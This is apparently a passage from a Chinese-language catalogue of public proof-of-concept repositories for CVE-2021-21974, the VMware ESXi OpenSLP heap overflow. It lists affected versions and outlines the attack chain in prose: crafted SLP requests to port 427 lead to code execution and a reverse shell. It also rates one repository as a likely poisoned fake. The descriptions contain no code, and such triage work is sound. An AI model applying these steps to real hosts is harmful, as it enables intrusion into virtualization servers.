1.  攻击者首先需要与目标ESXi主机处于同一网络段，确保可以访问其427端口。
2.  运行POC代码，并指定目标IP地址。
3.  POC代码会创建一个SLP线程，连接到目标主机的427端口。
4.  发送特制的SLP服务请求，该请求包含一个恶意的服务类型字符串，导致OpenSLP服务中的堆溢出。
5.  堆溢出允许攻击者覆盖内存中的数据，最终实现远程代码执行。
6.  POC代码执行shell命令，创建一个反弹shell，将目标主机的shell连接到攻击者的服务器。
7.  攻击者从而控制目标ESXi主机。

**项目地址:** [mercylessghost/CVE-2021-21974](https://github.com/mercylessghost/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #6

**来源**: [CVE-2021-21974-n2x4_Feb2023-CVE-2021-21974-OSINT.md](../2021/CVE-2021-21974-n2x4_Feb2023-CVE-2021-21974-OSINT.md)

## CVE-2021-21974 - VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并且能够访问427端口。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者通过向 ESXi 主机的 427 端口发送特制的 SLP 请求，触发 OpenSLP 服务的堆溢出，最终实现远程代码执行。

**有效性：**
从搜索结果来看，该漏洞已被广泛研究，并且存在公开的PoC。诸多安全厂商的报告显示，该漏洞被ESXiArgs 勒索软件利用，影响较大。Rapid7 等机构确认存在大量未修补的 ESXi 服务器，证明漏洞的利用是有效的。

**投毒风险：**
提供的“漏洞利用代码”实为一个名为`ESXResults.csv`的CSV文件，其中包含大量Bitcoin地址和对应的比特币数量以及一个TOXID。该文件很可能并非真正的漏洞利用代码，而是一个被伪装成PoC的恶意文件，目的是收集潜在受害者的信息（例如，关联受感染服务器和特定比特币地址），或者用于其他恶意目的，例如钓鱼攻击。因此，该文件存在极高的投毒风险。

**利用方式：**
根据漏洞信息，利用方式为：
1.  攻击者与目标 ESXi 主机处于同一网络段。
2.  攻击者能够访问 ESXi 主机的 427 端口（OpenSLP 服务端口）。
3.  攻击者构造恶意的 SLP 请求，发送到 ESXi 主机的 427 端口。
4.  OpenSLP 服务处理恶意请求时，发生堆溢出。
5.  攻击者利用堆溢出，执行任意代码，控制 ESXi 主机。

尽管实际的漏洞利用代码未提供，但从漏洞描述和搜索结果可以推断，该漏洞利用的重点在于构造特定的 SLP 请求，以触发 OpenSLP 服务的堆溢出。目前已经有公开的PoC，可用于生成有效的攻击载荷。

**项目地址:** [n2x4/Feb2023-CVE-2021-21974-OSINT](https://github.com/n2x4/Feb2023-CVE-2021-21974-OSINT)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

